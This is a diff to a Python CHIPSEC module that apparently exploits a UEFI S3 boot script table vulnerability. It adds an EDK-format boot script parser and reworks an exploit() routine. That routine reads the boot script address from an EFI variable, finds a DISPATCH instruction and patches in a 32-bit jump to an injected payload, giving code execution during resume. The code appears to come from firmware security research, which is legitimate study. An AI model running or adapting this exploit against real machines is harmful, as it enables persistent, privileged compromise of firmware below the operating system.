@@ -4,8 +4,6 @@ from chipsec.module_common import *
 from chipsec.hal.uefi import *
 from chipsec.hal.physmem import *
 
-import capstone
-
 
 _MODULE_NAME = 'boot_script_table'
 
@@ -82,6 +80,9 @@ def qword_at(data, off = 0): return _at(data, off, 8, 'Q')
 
 class BootScriptParser(object):    
 
+    BOOT_SCRIPT_EDK_SIGN = '\xAA'
+    BOOT_SCRIPT_EDK_HEADER_LEN = 0x34
+
     EFI_BOOT_SCRIPT_IO_WRITE_OPCODE = 0x00
     EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE = 0x01
     EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE = 0x02
@@ -91,6 +92,7 @@ class BootScriptParser(object):
     EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE = 0x06
     EFI_BOOT_SCRIPT_STALL_OPCODE = 0x07
     EFI_BOOT_SCRIPT_DISPATCH_OPCODE = 0x08
+    EFI_BOOT_SCRIPT_MEM_POLL_OPCODE = 0x09
 
     boot_script_ops = [
         'IO_WRITE',
@@ -101,7 +103,8 @@ class BootScriptParser(object):
         'PCI_CONFIG_READ_WRITE',
         'SMBUS_EXECUTE',
         'STALL',
-        'DISPATCH' ]
+        'DISPATCH',
+        'EFI_BOOT_SCRIPT_MEM_POLL_OPCODE' ]
 
     EfiBootScriptWidthUint8 = 0
     EfiBootScriptWidthUint16 = 1
@@ -191,12 +194,23 @@ class BootScriptParser(object):
 
         return values
 
-    def parse(self, data, boot_script_addr = 0L):
+    def op_name(self, op):
+
+        if op < len(self.boot_script_ops):
+
+            return self.boot_script_ops[op]
+
+        else:
+
+            return 'UNKNOWN_0x%X' % op
+
+    def parse_intel(self, data, boot_script_addr = 0L):
 
         ptr = 0
+
         while data:
 
-            num, size, op = unpack('IIB', data[:9])       
+            num, size, op = unpack('IIB', data[:9])
 
             if op == 0xff:
 
@@ -207,7 +221,7 @@ class BootScriptParser(object):
 
                 raise Exception('Invalid op 0x%x' % op)
 
-            self.log('#%d len=%d %s' % (num, size, self.boot_script_ops[op]))
+            self.log('#%d len=%d %s' % (num, size, self.op_name(op)))
 
             if op == self.EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE:
 
@@ -219,7 +233,7 @@ class BootScriptParser(object):
 
                 # get values list
                 values = self.read_values(data[32:], width, count)
-                
+
                 self.process_mem_write(width, addr, count, values)
 
             elif op == self.EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE:
@@ -228,11 +242,11 @@ class BootScriptParser(object):
                 width, count = byte_at(data, 9), qword_at(data, 24)
 
                 # get write adderss
-                addr = qword_at(data, 16)                
+                addr = qword_at(data, 16)
 
                 # get PCI device address
                 bus, dev, fun, off = (addr >> 24) & 0xff, (addr >> 16) & 0xff, \
-                                     (addr >> 8) & 0xff,  (addr >> 0) & 0xff                
+                                     (addr >> 8) & 0xff,  (addr >> 0) & 0xff
 
                 # get values list
                 values = self.read_values(data[32:], width, count)
@@ -267,6 +281,55 @@ class BootScriptParser(object):
             # go to the next instruction
             data = data[size:]
             ptr += size
+
+    def parse_edk(self, data, boot_script_addr = 0L):
+
+        ptr = num = 0
+
+        while data:
+
+            op, _, size = unpack('BBB', data[:3])
+
+            if op == 0xff:
+
+                self.log('# End of the boot script at offset 0x%x' % ptr)
+                break
+
+            if op < len(self.boot_script_ops):
+
+                name = self.boot_script_ops[op]
+
+            self.log('#%d len=%d %s' % (num, size, self.op_name(op)))
+
+            if op == self.EFI_BOOT_SCRIPT_DISPATCH_OPCODE:
+
+                # get call address
+                addr = qword_at(data, 3)
+
+                self.process_dispatch(addr)
+
+            else:
+
+                # skip unknown instruction
+                pass
+
+            # go to the next instruction
+            data = data[size:]
+            ptr += size
+            num += 1
+
+    def parse(self, data, boot_script_addr = 0L):
+
+        # check for AAh signature
+        if data[0] == self.BOOT_SCRIPT_EDK_SIGN:
+
+            # parse EDK format of boot script table
+            self.parse_edk(data[1 + self.BOOT_SCRIPT_EDK_HEADER_LEN:], boot_script_addr)
+
+        else:
+
+            # parse Intel format (DQ77KB, Q77 chipset) of boot script table
+            self.parse_intel(data, boot_script_addr)
 
 
 class Asm(object):
@@ -350,9 +413,17 @@ class boot_script_table(BaseModule):
             # boot script doesn't have any dispatch instructions
             return None
 
-    def _efi_read_u32(self, name, guid):
+    def _efi_var_read(self, name, guid):
 
-        return dword_at(self._uefi.get_EFI_variable(name, guid, None))
+        data = self._uefi.get_EFI_variable(name, guid, None)
+
+        if len(data) == 4:
+
+            return dword_at(data)
+
+        elif len(data) == 8:
+
+            return qword_at(data)
 
     def _mem_read(self, addr, size):
 
@@ -393,6 +464,8 @@ class boot_script_table(BaseModule):
             assert False
 
     def _disasm(self, data):
+    
+        import capstone
 
         dis = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
         dis.detail = True
@@ -473,14 +546,14 @@ class boot_script_table(BaseModule):
         # write 32-bit jump from function to payload
         self._mem_write(addr, self._jump_32(addr, buff_addr))
 
-        return buff_addr, buff_size, data
-        
+        return buff_addr, buff_size, data    
+
     def exploit(self):
 
         self.logger.start_test('UEFI boot script table vulnerability exploit')
 
         # read ACPI global variable structure data
-        AcpiGlobalVariable = self._efi_read_u32(self.EFI_VAR_NAME, self.EFI_VAR_GUID)        
+        AcpiGlobalVariable = self._efi_var_read(self.EFI_VAR_NAME, self.EFI_VAR_GUID)        
         
         print '[*] AcpiGlobalVariable = 0x%x' % AcpiGlobalVariable
 
@@ -489,11 +562,14 @@ class boot_script_table(BaseModule):
         boot_script = dword_at(data, 0x18)
 
         print '[*] UEFI boot script addr = 0x%x' % boot_script
+
+        assert boot_script != 0
         
+        data = self._mem_read(boot_script, 0x8000)
+
         # read and parse boot script
         dispatch_addr = self.CustomBootScriptParser(quiet = True).parse( \
-            self._mem_read(boot_script, 0x8000),
-            boot_script_addr = boot_script)
+            data, boot_script_addr = boot_script)
 
         if dispatch_addr is None:
 
